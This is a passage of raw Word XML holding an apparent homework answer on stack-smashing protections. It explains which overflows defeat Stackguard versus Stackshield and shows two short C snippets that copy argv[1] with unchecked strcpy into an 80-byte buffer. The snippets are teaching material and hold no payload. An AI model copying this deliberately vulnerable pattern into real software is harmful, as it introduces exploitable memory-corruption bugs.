      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ats</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="111"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proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i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ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:spacing w:val="-3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kgu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d</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ck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page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ace.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104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c)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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H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w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ld</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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4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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/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 xml:space="preserve">gthen </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/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ef</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/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d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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ai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st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ou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attack </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00373362" w:rsidRDefault="00373362">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/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For (</w:t>
      </w:r>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) a stack buffer overflow that </w:t>
      </w:r>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">is able to leave the canary intact, but </w:t>
      </w:r>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>replaces the return address</w:t>
      </w:r>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> would defeat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Stackguard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (since the canary is still correct), but would not defeat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Stackshield</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B01256" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (since the return address would be different</w:t>
      </w:r>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B01256" w:rsidRPr="004B309E" w:rsidRDefault="00B01256" w:rsidP="00B01256">
      <w:pPr>
        <w:ind w:left="104"/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 xml:space="preserve">For (b) a stack buffer overflow that </w:t>
      </w:r>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">is able to keep the return address intact, but not the canary would defeat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Stackshield</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (since the return address would be the same), but would not defeat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Stackguard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004B309E" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (since the canary would be different)</w:t>
      </w:r>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRDefault="004B309E">
      <w:pPr>
        <w:ind w:left="104"/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For (c</w:t>
      </w:r>
      <w:r w:rsidR="00893EAE" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">protect the frame pointer the same way the </w:t>
      </w:r>
      <w:r w:rsidR="00893EAE" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">stack </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pointer is protected</w:t>
      </w:r>
      <w:r w:rsidR="0019787E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or to put a canary between the local variables/local buffers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/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 xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00373362">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gram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func</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(char *</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidR="00893EAE" w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:proofErr w:type="gram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buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[80];</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>buf,msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>msg,buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE" w:rsidP="00893EAE">
      <w:pPr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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00373362" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> main(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spell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argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, char** </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00893EAE" w:rsidRPr="004B309E" w:rsidRDefault="00893EAE" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>func</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[1]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="00373362" w:rsidP="00E15887">
      <w:pPr>
        <w:ind w:left="104"/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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>void</w:t>
      </w:r>
      <w:proofErr w:type="gram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func</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(char *</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:proofErr w:type="gram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buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[80];</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:ind w:left="104" w:firstLine="616"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>buf,msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> main(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, char** </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>func</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[1]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRDefault="004B309E" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0019787E" w:rsidRPr="004B309E" w:rsidRDefault="0019787E" w:rsidP="00893EAE">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004B309E" w:rsidRPr="004B309E" w:rsidRDefault="004B309E" w:rsidP="004B309E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="004B309E" w:rsidRPr="004B309E">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>snipets</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004B309E">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> from: http://www.coresecurity.com/files/attachments/StackguardPaper.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="39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2006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006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07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5]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sec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
